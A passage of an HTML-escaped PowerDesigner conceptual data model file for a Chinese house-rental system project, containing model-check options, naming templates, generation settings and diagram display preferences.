Item\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\InfoNotUsed]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\InfoUsedSevTime]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\InfoDiffDomn]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\CheckNumParam]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\CheckPrecSupLng]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\CheckUndefDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\CheckOtherDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\CheckDttpIncompatibleFormat]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity][FolderOptions\\CheckModel\\Entity\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\MaxLen - NAME]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttNoAttrNo]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttNbSerials]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttNoAttrYes]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EmptyCollYesYes]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttSamePrnt]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttMultInhr]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttSevInhr]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\PidtfInhrAtt]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute][FolderOptions\\CheckModel\\Entity.Entity Attribute\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier][FolderOptions\\CheckModel\\Entity.Identifier\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\EmptyColl - PENTCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\CheckIncludeColl - Entt]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\IdtfChildPIdtf]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship][FolderOptions\\CheckModel\\Relationship\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\RlshReflexiveDeptYes]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\RlshReflexiveDeptNo]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\RlshBject]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\RlshMnyMny]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\RlshDepdChild]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association][FolderOptions\\CheckModel\\Association\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\AsscNbLink]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\AsscNbIdLink1]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\AsscNbIdLink2]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\AsscIdPass]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\AsscBject]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\AsscMaxCard]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\AsscReflex]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Association\\AsscMnyMny]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance][FolderOptions\\CheckModel\\Inheritance\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\EmptyColl - CHILDCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Replication][FolderOptions\\CheckModel\\Replication\\PartialReplication]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule][FolderOptions\\CheckModel\\Business Rule\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\EmptyColl - OBJCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object][FolderOptions\\CheckModel\\Extended Object\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link][FolderOptions\\CheckModel\\Extended Link\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File][FolderOptions\\CheckModel\\File\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\CheckPathExists]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format][FolderOptions\\CheckModel\\Data Format\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\CheckDataFormatNullExpression]CheckSeverity=NoFixRequested=NoCheckRequested=Yes&lt;/a:PackageOptionsText&gt;&lt;a:ModelOptionsText&gt;[ModelOptions][ModelOptions\\Conceptual options]CaseSensitive=NoDisplayName=YesEnableTrans=NoUseTerm=NoEnableRequirements=NoEnableFullShortcut=YesSynchroCode=YesInfoUnique=YesAllowReuse=YesInfoAllowReuse=YesNotation=2RlshUnique=YesDefaultDttp=DomnCopyDttp=YesDomnCopyChck=NoDomnCopyRule=NoDomnCopyExat=NoDomnCopyMand=NoDttpFullName=YesRlshAsstTmpl=Each %Entity1.Name%[CRLF].if %Entity1ToEntity2RoleMandatory%[CRLF] must[CRLF].else[CRLF] may[CRLF].endif[CRLF].if %Entity1ToEntity2Role%[CRLF] %.L:Entity1ToEntity2Role%[CRLF].else[CRLF] have[CRLF].endif[CRLF].if %Entity1ToEntity2RoleMaximumCardinality%==1[CRLF].if %Entity1ToEntity2RoleMandatory%[CRLF] one and only one[CRLF].else[CRLF] at most one[CRLF].endif[CRLF].else[CRLF] one or more[CRLF].endif[CRLF].if %Entity1%==%Entity2%[CRLF] other[CRLF].endif[CRLF] %Entity2.Name%.[CRLF]Each %Entity2.Name%[CRLF].if %Entity2ToEntity1RoleMandatory%[CRLF] must[CRLF].else[CRLF] may[CRLF].endif[CRLF].if %Entity2ToEntity1Role%[CRLF] %.L:Entity2ToEntity1Role%[CRLF].else[CRLF] have[CRLF].endif[CRLF].if %Entity2ToEntity1RoleMaximumCardinality%==1[CRLF].if %Entity2ToEntity1RoleMandatory%[CRLF] one and only one[CRLF].else[CRLF] at most one[CRLF].endif[CRLF].else[CRLF] one or more[CRLF].endif[CRLF].if %Entity1%==%Entity2%[CRLF] other[CRLF].endif[CRLF] %Entity1.Name%.RlshAsstExt=[ModelOptions\\Conceptual options\\NamingOptionsTemplates][ModelOptions\\Conceptual options\\ClssNamingOptions][ModelOptions\\Conceptual options\\ClssNamingOptions\\FILO][ModelOptions\\Conceptual options\\ClssNamingOptions\\FILO\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\FILO\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\FRMEOBJ][ModelOptions\\Conceptual options\\ClssNamingOptions\\FRMEOBJ\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\FRMEOBJ\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\FRMELNK][ModelOptions\\Conceptual options\\ClssNamingOptions\\FRMELNK\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\FRMELNK\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\DefaultClass][ModelOptions\\Conceptual options\\ClssNamingOptions\\DefaultClass\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\DefaultClass\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\CDMPCKG][ModelOptions\\Conceptual options\\ClssNamingOptions\\CDMPCKG\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\CDMPCKG\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\CDMDOMN][ModelOptions\\Conceptual options\\ClssNamingOptions\\CDMDOMN\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\CDMDOMN\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\INFO][ModelOptions\\Conceptual options\\ClssNamingOptions\\INFO\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\INFO\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\ENTT][ModelOptions\\Conceptual options\\ClssNamingOptions\\ENTT\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\ENTT\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\IDTF][ModelOptions\\Conceptual options\\ClssNamingOptions\\IDTF\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\IDTF\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\RLSH][ModelOptions\\Conceptual options\\ClssNamingOptions\\RLSH\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\RLSH\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\ASSC][ModelOptions\\Conceptual options\\ClssNamingOptions\\ASSC\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\ASSC\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\CDMINHR][ModelOptions\\Conceptual options\\ClssNamingOptions\\CDMINHR\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Conceptual options\\ClssNamingOptions\\CDMINHR\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Generate][ModelOptions\\Generate\\Pdm]CheckModel=YesSaveLinks=YesNameToCode=NoBuildTrgr=NoTablePrefix=IndxPKName=%TABLE%_PKIndxAKName=%TABLE%_AKIndxFKName=%REFR%_FKIndxThreshold=ClassPrefix=ColnFKName=%.3:PARENT%_%COLUMN%ColnFKNameUse=No[ModelOptions\\Generate\\Oom]CheckModel=YesSaveLinks=YesNameToCode=Yes[ModelOptions\\Generate\\Ldm]CheckModel=YesSaveLinks=YesNameToCode=NoPreserveMode=YesEnableTransformations=NoRlshGenNN=No&lt;/a:ModelOptionsText&gt;&lt;a:RepositoryFilename&gt;%_EXAMPLES%\\我的项目\\房屋租赁系统.cdm&lt;/a:RepositoryFilename&gt;&lt;c:GeneratedModels&gt;&lt;o:Shortcut Id=&quot;o3&quot;&gt;&lt;a:ObjectID&gt;4FB8D889-CDB8-4FA4-9167-EDA7559FF9E6&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325546&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325546&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetStereotype/&gt;&lt;a:TargetID&gt;E0CA7255-710D-4C0F-8906-045A9AB7CB75&lt;/a:TargetID&gt;&lt;a:TargetClassID&gt;5F45F978-C4F3-4E35-A3FC-AF3318663A0F&lt;/a:TargetClassID&gt;&lt;/o:Shortcut&gt;&lt;/c:GeneratedModels&gt;&lt;c:ConceptualDiagrams&gt;&lt;o:ConceptualDiagram Id=&quot;o4&quot;&gt;&lt;a:ObjectID&gt;0A29E6FF-59EC-4690-AAFB-D878AB26683D&lt;/a:ObjectID&gt;&lt;a:Name&gt;表一&lt;/a:Name&gt;&lt;a:Code&gt;表一&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315037&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618323460&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DisplayPreferences&gt;[DisplayPreferences][DisplayPreferences\\CDM][DisplayPreferences\\General]Adjust to text=YesSnap Grid=NoConstrain Labels=YesDisplay Grid=NoShow Page Delimiter=NoShow Links intersections=YesActivate automatic link routing=YesGrid size=800Graphic unit=2Window color=255 255 255Background image=Background mode=8Watermark image=Watermark mode=8Show watermark on screen=NoGradient mode=0Gradient end color=255 255 255Show Swimlane=NoSwimlaneVert=YesTreeVert=NoCompDark=0[DisplayPreferences\\Object]Show Icon=NoMode=0Trunc Length=80Word Length=80Word Text=!&amp;quot;&amp;quot;#$%&amp;amp;&amp;#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\\]^_`&#123;|&#125;~Shortcut IntIcon=YesShortcut IntLoct=YesShortcut IntFullPath=NoShortcut IntLastPackage=YesShortcut ExtIcon=YesShortcut ExtLoct=NoShortcut ExtFullPath=NoShortcut ExtLastPackage=YesShortcut ExtIncludeModl=YesEObjShowStrn=YesExtendedObject.Comment=NoExtendedObject.IconPicture=NoExtendedObject.TextStyle=NoExtendedObject_SymbolLayout=ELnkShowStrn=YesELnkShowName=YesExtendedLink_SymbolLayout=ExtDpdShowStrn=YesExtendedDependency_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Stereotype&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;FileObject.Stereotype=NoFileObject.DisplayName=YesFileObject.LocationOrName=NoFileObject.IconPicture=NoFileObject.TextStyle=NoFileObject.IconMode=YesFileObject_SymbolLayout=Package.Stereotype=YesPackage.Comment=NoPackage.IconPicture=NoPackage.TextStyle=NoPackage_SymbolLayout=Display Model Version=YesEntity.Stereotype=YesEntity.Attributes=YesEntity.Attributes._Filter=所有属性 CDMPENTALLEntity.Attributes._Columns=Stereotype DomainOrDataType IdentifierIndicator NullIndicatorEntity.Attributes._Limit=-5Entity.Identifiers=YesEntity.Identifiers._Columns=Stereotype IdentifierIndicatorEntity.Comment=NoEntity.IconPicture=NoEntity.TextStyle=NoEntity.SubSymbols=YesEntity_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Attributes&amp;quot; Collection=&amp;quot;Attributes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标\\r\\nDataType No\\r\\nDomainOrDataType No 域或数据类型\\r\\nDomain No\\r\\nNullIndicator No 强制性&amp;quot; Filters=&amp;quot;所有属性 CDMPENTALL &amp;amp;quot;&amp;amp;quot;\\r\\n主属性 CDMPENTPK &amp;amp;quot;\\&amp;amp;quot;PIDTF \\&amp;amp;quot;TRUE\\&amp;amp;quot; 